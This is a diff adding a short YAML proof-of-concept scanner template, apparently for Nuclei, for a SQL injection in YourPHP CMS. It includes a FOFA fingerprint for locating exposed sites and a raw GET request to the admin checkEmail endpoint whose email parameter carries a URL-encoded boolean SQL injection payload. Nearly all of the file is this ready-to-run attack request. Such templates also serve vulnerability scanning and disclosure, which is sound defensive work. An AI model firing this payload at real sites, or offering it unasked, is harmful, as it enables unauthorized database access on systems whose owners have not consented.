@@ -1,0 +1,21 @@
+id: poc-ikeqv6q2vxdo5ygg
+info:
+  name: yourphp cms email sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikeqv6q2vxdo5ygg'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ikeqv6q2vxdo5ygg
+    fofa: header="YP_onlineid"
+http:
+- raw:
+  - 'GET /index.php?g=Admin&m=Login&a=checkEmail&userid=1&email=-3426%27%20OR%201=2%20AND%20%27RYHI%27=%27RYHI HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
